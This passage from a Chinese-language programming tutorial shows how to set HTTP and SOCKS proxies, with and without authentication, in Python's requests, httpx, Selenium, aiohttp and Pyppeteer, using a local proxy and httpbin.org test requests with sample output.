                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7891'</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'socks5://'</span> + proxy,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'socks5://'</span> + proxy</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">'https://httpbin.org/get'</span>, proxies=proxies)</span><br><span class="line">    print(response.text)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">'Error'</span>, e.args)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们需要额外安装一个包 <code>requests[socks]</code>，相关命令如下所示：</p>
                  <figure class="highlight plain">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pip3 install &quot;requests[socks]&quot;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果是完全相同的：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">"headers"</span>: &#123;</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"*/*"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"python-requests/2.22.0"</span>,</span><br><span class="line">    <span class="string">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e8f364a-589d3cf2500fafd47b5560f2"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="string">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>另外，还有一种设置方式，即使用 socks 模块，也需要像上文一样安装 socks 库。这种设置方法如下所示：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">socks.set_default_proxy(socks.SOCKS5, <span class="string">'127.0.0.1'</span>, <span class="number">7891</span>)</span><br><span class="line">socket.socket = socks.socksocket</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(response.text)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">'Error'</span>, e.args)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>使用这种方法也可以设置 SOCKS 代理，运行结果完全相同。相比第一种方法，此方法是全局设置的。我们可以在不同情况下选用不同的方法。</p>
                  <h2 id="4-httpx-的代理设置"><a href="#4-httpx-的代理设置" class="headerlink" title="4. httpx 的代理设置"></a>4. httpx 的代理设置</h2>
                  <p>httpx 的用法本身就与 requests 的使用非常相似，所以其也是通过 proxies 参数来设置代理的，不过与 requests 不同的是，proxies 参数的键名不能再是 <code>http</code> 或 <code>https</code>，而需要更改为 <code>http://</code> 或 <code>https://</code>，其他的设置是一样的。</p>
                  <p>对于 HTTP 代理来说，设置方法如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7890'</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">'http://'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">    <span class="string">'https://'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> httpx.Client(proxies=proxies) <span class="keyword">as</span> client:</span><br><span class="line">    response = client.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(response.text)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>对于需要认证的代理，也是改下 proxy 的值即可：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">proxy = <span class="string">'username:password@127.0.0.1:7890'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里只需要将 <code>username</code> 和 <code>password</code> 替换即可。</p>
                  <p>运行结果和使用 requests 是类似的，结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept"</span>: <span class="string">"*/*"</span>,</span><br><span class="line">    <span class="attr">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"python-httpx/0.18.1"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-60e9a3ef-5527ff6320484f8e46d39834"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>对于 SOCKS 代理，我们需要安装 httpx-socks 库，安装方法如下：</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pip3 <span class="keyword">install</span> <span class="string">"httpx-socks[asyncio]"</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样会同时安装同步和异步两种模式的支持。</p>
                  <p>对于同步模式，设置方法如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">from</span> httpx_socks <span class="keyword">import</span> SyncProxyTransport</span><br><span class="line"></span><br><span class="line">transport = SyncProxyTransport.from_url(</span><br><span class="line">    <span class="string">'socks5://127.0.0.1:7891'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> httpx.Client(transport=transport) <span class="keyword">as</span> client:</span><br><span class="line">    response = client.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(response.text)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们需要设置一个 transport 对象，并配置 SOCKS 代理的地址，同时在声明 httpx 的 Client 对象的时候传入 transport 参数即可，运行结果和刚才是一样的。</p>
                  <p>对于异步模式，设置方法如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> httpx_socks <span class="keyword">import</span> AsyncProxyTransport</span><br><span class="line"></span><br><span class="line">transport = AsyncProxyTransport.from_url(</span><br><span class="line">    <span class="string">'socks5://127.0.0.1:7891'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> httpx.AsyncClient(transport=transport) <span class="keyword">as</span> client:</span><br><span class="line">        response = <span class="keyword">await</span> client.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">        print(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main())</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>和同步模式不同的是，transport 对象我们用的是 AsyncProxyTransport 而不是 SyncProxyTransport，同时需要将 Client 对象更改为 AsyncClient 对象，其他的不变，运行结果是一样的。</p>
                  <h2 id="5-Selenium-的代理设置"><a href="#5-Selenium-的代理设置" class="headerlink" title="5. Selenium 的代理设置"></a>5. Selenium 的代理设置</h2>
                  <p>Selenium 同样可以设置代理，这里以 Chrome 为例来介绍其设置方法。</p>
                  <p>对于无认证的代理，设置方法如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7890'</span></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line">options.add_argument(<span class="string">'--proxy-server=http://'</span> + proxy)</span><br><span class="line">browser = webdriver.Chrome(options=options)</span><br><span class="line">browser.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">print(browser.page_source)</span><br><span class="line">browser.close()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>,</span><br><span class="line">    <span class="attr">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="attr">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e8f39cd-60930018205fd154a9af39cc"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"http://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>代理设置成功，<code>origin</code> 同样为代理 IP 的地址。</p>
                  <p>如果代理是认证代理，则设置方法相对比较繁琐，具体如下所示：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">7890</span></span><br><span class="line">username = <span class="string">'foo'</span></span><br><span class="line">password = <span class="string">'bar'</span></span><br><span class="line"></span><br><span class="line">manifest_json = <span class="string">"""&#123;"version":"1.0.0","manifest_version": 2,"name":"Chrome Proxy","permissions": ["proxy","tabs","unlimitedStorage","storage","&lt;all_urls&gt;","webRequest","webRequestBlocking"],"background": &#123;"scripts": ["background.js"]</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">background_js = <span class="string">"""</span></span><br><span class="line"><span class="string">var config = &#123;</span></span><br><span class="line"><span class="string">        mode: "fixed_servers",</span></span><br><span class="line"><span class="string">        rules: &#123;</span></span><br><span class="line"><span class="string">          singleProxy: &#123;</span></span><br><span class="line"><span class="string">            scheme: "http",</span></span><br><span class="line"><span class="string">            host: "%(ip) s",</span></span><br><span class="line"><span class="string">            port: %(port) s</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">chrome.proxy.settings.set(&#123;value: config, scope: "regular"&#125;, function() &#123;&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function callbackFn(details) &#123;</span></span><br><span class="line"><span class="string">    return &#123;</span></span><br><span class="line"><span class="string">        authCredentials: &#123;username: "%(username) s",</span></span><br><span class="line"><span class="string">            password: "%(password) s"</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">chrome.webRequest.onAuthRequired.addListener(</span></span><br><span class="line"><span class="string">            callbackFn,</span></span><br><span class="line"><span class="string">            &#123;urls: ["&lt;all_urls&gt;"]&#125;,</span></span><br><span class="line"><span class="string">            ['blocking']</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">"""</span> % &#123;<span class="string">'ip'</span>: ip, <span class="string">'port'</span>: port, <span class="string">'username'</span>: username, <span class="string">'password'</span>: password&#125;</span><br><span class="line"></span><br><span class="line">plugin_file = <span class="string">'proxy_auth_plugin.zip'</span></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(plugin_file, <span class="string">'w'</span>) <span class="keyword">as</span> zp:</span><br><span class="line">    zp.writestr(<span class="string">"manifest.json"</span>, manifest_json)</span><br><span class="line">    zp.writestr(<span class="string">"background.js"</span>, background_js)</span><br><span class="line">options = Options()</span><br><span class="line">options.add_argument(<span class="string">"--start-maximized"</span>)</span><br><span class="line">options.add_extension(plugin_file)</span><br><span class="line">browser = webdriver.Chrome(options=options)</span><br><span class="line">browser.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">print(browser.page_source)</span><br><span class="line">browser.close()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里需要在本地创建一个 manifest.json 配置文件和 background.js 脚本来设置认证代理。运行代码之后，本地会生成一个 proxy_auth_plugin.zip 文件来保存当前配置。</p>
                  <p>运行结果和上例一致，<code>origin</code> 同样为代理 IP。</p>
                  <p>SOCKS 代理的设置也比较简单，把对应的协议修改为 <code>socks5</code> 即可，如无密码认证的代理设置方法为：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7891'</span></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line">options.add_argument(<span class="string">'--proxy-server=socks5://'</span> + proxy)</span><br><span class="line">browser = webdriver.Chrome(options=options)</span><br><span class="line">browser.get(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">print(browser.page_source)</span><br><span class="line">browser.close()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果是一样的。</p>
                  <h2 id="6-aiohttp-的代理设置"><a href="#6-aiohttp-的代理设置" class="headerlink" title="6.aiohttp 的代理设置"></a>6.aiohttp 的代理设置</h2>
                  <p>对于 aiohttp 来说，我们可以通过 <code>proxy</code> 参数直接设置。HTTP 代理设置如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'http://127.0.0.1:7890'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(<span class="string">'https://httpbin.org/get'</span>, proxy=proxy) <span class="keyword">as</span> response:</span><br><span class="line">            print(<span class="keyword">await</span> response.text())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main())</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如果代理有用户名和密码，像 requests 一样，把 <code>proxy</code> 修改为如下内容：</p>
                  <figure class="highlight ini">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attr">proxy</span> = <span class="string">'http://username:password@127.0.0.1:7890'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里只需要将 <code>username</code> 和 <code>password</code> 替换即可。</p>
                  <p>对于 SOCKS 代理，我们需要安装一个支持库 aiohttp-socks，其安装命令如下：</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pip3 <span class="keyword">install</span> aiohttp-socks</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>我们可以借助于这个库的 ProxyConnector 来设置 SOCKS 代理，其代码如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">from</span> aiohttp_socks <span class="keyword">import</span> ProxyConnector</span><br><span class="line"></span><br><span class="line">connector = ProxyConnector.from_url(<span class="string">'socks5://127.0.0.1:7891'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(connector=connector) <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(<span class="string">'https://httpbin.org/get'</span>) <span class="keyword">as</span> response:</span><br><span class="line">            print(<span class="keyword">await</span> response.text())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main())</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果是一样的。</p>
                  <p>另外，这个库还支持设置 SOCKS4、HTTP 代理以及对应的代理认证，可以参考其官方介绍。</p>
                  <h2 id="7-Pyppeteer-的代理设置"><a href="#7-Pyppeteer-的代理设置" class="headerlink" title="7. Pyppeteer 的代理设置"></a>7. Pyppeteer 的代理设置</h2>
                  <p>对于 Pyppeteer 来说，由于其默认使用的是类似 Chrome 的 Chromium 浏览器，因此其设置方法和 Selenium 的 Chrome 一样，如 HTTP 无认证代理设置方法都是通过 <code>args</code> 来设置的，实现如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7890'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    browser = <span class="keyword">await</span> launch(&#123;<span class="string">'args'</span>: [<span class="string">'--proxy-server=http://'</span> + proxy], <span class="string">'headless'</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(<span class="keyword">await</span> page.content())</span><br><span class="line">    <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main())</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="attr">"Accept-Encoding"</span>: <span class="string">"gzip, deflate, br"</span>,</span><br><span class="line">    <span class="attr">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3494.0 Safari/537.36"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e8f442c-12b1ed7865b049007267a66c"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>同样可以看到设置成功。</p>
                  <p>SOCKS 代理也一样，只需要将协议修改为 <code>socks5</code> 即可，代码实现如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'127.0.0.1:7891'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    browser = <span class="keyword">await</span> launch(&#123;<span class="string">'args'</span>: [<span class="string">'--proxy-server=socks5://'</span> + proxy], <span class="string">'headless'</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(<span class="keyword">await</span> page.content())</span><br><span class="line">    <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main())</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果也是一样的。</p>
